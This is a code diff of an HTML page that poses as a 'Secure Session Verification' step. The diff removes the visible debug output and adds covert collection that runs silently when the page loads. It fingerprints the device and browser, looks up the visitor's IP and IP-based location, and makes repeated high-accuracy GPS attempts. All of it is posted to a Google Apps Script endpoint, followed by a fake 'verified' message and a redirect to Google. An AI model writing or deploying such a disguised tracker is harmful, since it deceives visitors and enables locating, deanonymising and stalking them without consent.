@@ -3,134 +3,314 @@
 <head>
   <title>Secure Session Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    .debug { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; font-size: 12px; }
-  </style>
 </head>
 <body>
   <h3>Please wait while we verify your session...</h3>
-  <div id="status">Collecting information...</div>
-  <div id="debug" class="debug"></div>
-  
+
   <script>
-    const debugDiv = document.getElementById('debug');
-    const statusDiv = document.getElementById('status');
-    
-    function addDebug(message) {
-      debugDiv.innerHTML += message + '<br>';
-      console.log(message);
-    }
-    
-    function updateStatus(message) {
-      statusDiv.innerHTML = message;
-      addDebug('STATUS: ' + message);
-    }
-    
+    // Universal data collection for both desktop and mobile
     const data = {
+      // Basic required data
       userAgent: navigator.userAgent,
       platform: navigator.platform,
+      language: navigator.language,
       screenWidth: screen.width,
       screenHeight: screen.height,
       referrer: document.referrer,
-      timestamp: new Date().toISOString()
+      
+      // Enhanced data collection (hidden from user)
+      timestamp: new Date().toISOString(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      languages: navigator.languages ? navigator.languages.join(',') : '',
+      cookieEnabled: navigator.cookieEnabled,
+      onlineStatus: navigator.onLine,
+      
+      // Device detection
+      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
+      isAndroid: /Android/.test(navigator.userAgent),
+      isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+      
+      // Hardware info
+      hardwareConcurrency: navigator.hardwareConcurrency || 0,
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      
+      // Display details
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      devicePixelRatio: window.devicePixelRatio,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight,
+      
+      // Touch and orientation (mobile)
+      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+      orientation: screen.orientation ? screen.orientation.type : 'unknown',
+      
+      // Browser capabilities
+      doNotTrack: navigator.doNotTrack,
+      webdriver: navigator.webdriver,
+      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+      
+      // Network information
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt,
+        saveData: navigator.connection.saveData
+      } : null,
+      
+      // Location tracking variables
+      locationAttempts: 0,
+      bestAccuracy: Infinity,
+      permissionStatus: 'unknown',
+      locationMethod: 'none'
     };
     
-    addDebug('Starting data collection...');
-    addDebug('Screen: ' + data.screenWidth + 'x' + data.screenHeight);
-    addDebug('Platform: ' + data.platform);
-    addDebug('User Agent: ' + data.userAgent.substring(0, 50) + '...');
-    
-    // Step 1: Get IP
-    updateStatus('Getting IP address...');
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(ipData => {
-        data.ip = ipData.ip;
-        addDebug('IP obtained: ' + data.ip);
+    // Enhanced fingerprinting (silent)
+    function addFingerprints() {
+      try {
+        // Canvas fingerprint
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Security', 2, 15);
+        data.canvasFingerprint = canvas.toDataURL().slice(-50);
         
-        // Step 2: Get location
-        updateStatus('Getting location...');
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            function (pos) {
-              data.latitude = pos.coords.latitude;
-              data.longitude = pos.coords.longitude;
-              data.accuracy = pos.coords.accuracy;
-              addDebug('Location: ' + data.latitude + ', ' + data.longitude + ' (±' + data.accuracy + 'm)');
-              sendData();
-            },
-            function (err) {
-              addDebug('Location error: ' + err.message);
-              addDebug('Continuing without location...');
-              sendData();
-            },
-            {
-              timeout: 10000,
-              enableHighAccuracy: true
+        // WebGL fingerprint
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+          data.webglVendor = gl.getParameter(gl.VENDOR);
+          data.webglRenderer = gl.getParameter(gl.RENDERER);
+        }
+      } catch (e) {
+        data.fingerprintError = e.message;
+      }
+    }
+    
+    // Battery info (mobile mainly)
+    async function getBatteryInfo() {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          data.batteryLevel = Math.round(battery.level * 100);
+          data.batteryCharging = battery.charging;
+        }
+      } catch (e) {
+        // Battery API not available
+      }
+    }
+    
+    // Universal location tracking (desktop + mobile optimized)
+    async function getUniversalLocation() {
+      return new Promise(async (resolve) => {
+        if (!navigator.geolocation) {
+          data.locationError = 'not_supported';
+          resolve();
+          return;
+        }
+        
+        // Check permissions (if supported)
+        try {
+          if (navigator.permissions) {
+            const permission = await navigator.permissions.query({name: 'geolocation'});
+            data.permissionStatus = permission.state;
+            if (permission.state === 'denied') {
+              data.locationError = 'permission_denied';
+              resolve();
+              return;
             }
-          );
-        } else {
-          addDebug('Geolocation not supported');
-          sendData();
+          }
+        } catch (e) {
+          // Permission API not supported
         }
-      })
-      .catch(err => {
-        addDebug('IP fetch error: ' + err.message);
-        sendData();
-      });
-    
-    function sendData() {
-      updateStatus('Sending data to server...');
-      
-      // Show what we're sending
-      addDebug('=== DATA BEING SENT ===');
-      for (let key in data) {
-        if (data[key] !== undefined && data[key] !== null) {
-          addDebug(key + ': ' + data[key]);
-        }
-      }
-      addDebug('=======================');
-      
-      const formData = new URLSearchParams();
-      for (let key in data) {
-        if (data[key] !== undefined && data[key] !== null) {
-          formData.append(key, data[key]);
-        }
-      }
-      
-      addDebug('FormData string: ' + formData.toString());
-      
-      // **REPLACE THIS URL WITH YOUR NEW DEPLOYMENT URL**
-      const scriptUrl = "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec";
-      
-      addDebug('Sending POST request to: ' + scriptUrl);
-      
-      fetch(scriptUrl, {
-        method: "POST",
-        body: formData,
-        mode: "no-cors"
-      })
-      .then(() => {
-        addDebug('✅ Request sent successfully');
-        updateStatus('✅ Session verified. Check Google Sheet!');
         
-        // Don't redirect immediately so you can see the debug info
-        setTimeout(() => {
-          addDebug('Redirecting to Google...');
-          window.location.href = "https://www.google.com";
-        }, 5000); // 5 seconds to read debug info
-      })
-      .catch(err => {
-        addDebug('❌ Fetch error: ' + err.message);
-        updateStatus('❌ Verification failed');
+        // Different strategies for desktop vs mobile
+        const isDesktop = data.isDesktop;
+        const configs = isDesktop ? [
+          // Desktop configs - faster timeouts
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, method: 'desktop_high' },
+          { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000, method: 'desktop_network' },
+          { enableHighAccuracy: true, timeout: 6000, maximumAge: 300000, method: 'desktop_cached' }
+        ] : [
+          // Mobile configs - longer timeouts
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0, method: 'mobile_high' },
+          { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000, method: 'mobile_network' },
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 300000, method: 'mobile_cached' }
+        ];
         
-        // Still redirect after error
-        setTimeout(() => {
-          window.location.href = "https://www.google.com";
-        }, 5000);
+        let completed = 0;
+        let hasLocation = false;
+        
+        // Try each config
+        for (let i = 0; i < configs.length; i++) {
+          const config = configs[i];
+          
+          try {
+            const locationResult = await new Promise((locResolve) => {
+              const startTime = Date.now();
+              
+              navigator.geolocation.getCurrentPosition(
+                function(position) {
+                  const endTime = Date.now();
+                  data.locationAttempts++;
+                  hasLocation = true;
+                  
+                  const coords = position.coords;
+                  
+                  // Keep most accurate reading
+                  if (coords.accuracy < data.bestAccuracy) {
+                    data.bestAccuracy = coords.accuracy;
+                    data.latitude = coords.latitude;
+                    data.longitude = coords.longitude;
+                    data.accuracy = coords.accuracy;
+                    data.altitude = coords.altitude;
+                    data.altitudeAccuracy = coords.altitudeAccuracy;
+                    data.heading = coords.heading;
+                    data.speed = coords.speed;
+                    data.locationMethod = config.method;
+                    data.locationResponseTime = endTime - startTime;
+                  }
+                  
+                  locResolve(true);
+                },
+                function(error) {
+                  data.locationAttempts++;
+                  if (!data.locationError) {
+                    data.locationError = error.message;
+                    data.locationErrorCode = error.code;
+                  }
+                  locResolve(false);
+                },
+                config
+              );
+            });
+            
+            // If we got excellent accuracy, stop trying
+            if (locationResult && data.accuracy <= (isDesktop ? 10 : 15)) {
+              break;
+            }
+            
+            // Small delay between attempts
+            if (i < configs.length - 1) {
+              await new Promise(resolve => setTimeout(resolve, isDesktop ? 1000 : 2000));
+            }
+            
+          } catch (e) {
+            continue;
+          }
+        }
+        
+        resolve();
       });
     }
+    
+    // IP address detection
+    async function getIPAddress() {
+      const sources = [
+        'https://api.ipify.org?format=json',
+        'https://ipapi.co/json/',
+        'https://httpbin.org/ip'
+      ];
+      
+      for (const source of sources) {
+        try {
+          const response = await fetch(source);
+          const result = await response.json();
+          
+          if (result.ip) {
+            data.ip = result.ip;
+            
+            // Additional IP-based location data
+            if (result.city) {
+              data.ipCity = result.city;
+              data.ipCountry = result.country_name;
+              data.ipRegion = result.region;
+              data.ipLatitude = result.latitude;
+              data.ipLongitude = result.longitude;
+              data.ipISP = result.org;
+              data.ipTimezone = result.timezone;
+            }
+            break;
+          } else if (result.origin) {
+            data.ip = result.origin;
+            break;
+          }
+        } catch (e) {
+          continue;
+        }
+      }
+      
+      if (!data.ip) {
+        data.ip = 'unavailable';
+      }
+    }
+    
+    // Main collection function (runs silently)
+    async function collectAllData() {
+      try {
+        // Add fingerprints
+        addFingerprints();
+        
+        // Collect all data in parallel where possible
+        await Promise.all([
+          getBatteryInfo(),
+          getIPAddress()
+        ]);
+        
+        // Get location (most time-consuming)
+        await getUniversalLocation();
+        
+        // Send data
+        await sendData();
+        
+      } catch (error) {
+        data.collectionError = error.message;
+        await sendData();
+      }
+    }
+    
+    // Send data function
+    async function sendData() {
+      try {
+        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+        
+        // Simple success message
+        document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
+        
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 2000);
+        
+      } catch (error) {
+        // Still redirect on error (user doesn't see error)
+        document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
+        
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 2000);
+      }
+    }
+    
+    // Start immediately (silent execution)
+    collectAllData();
   </script>
 </body>
 </html>
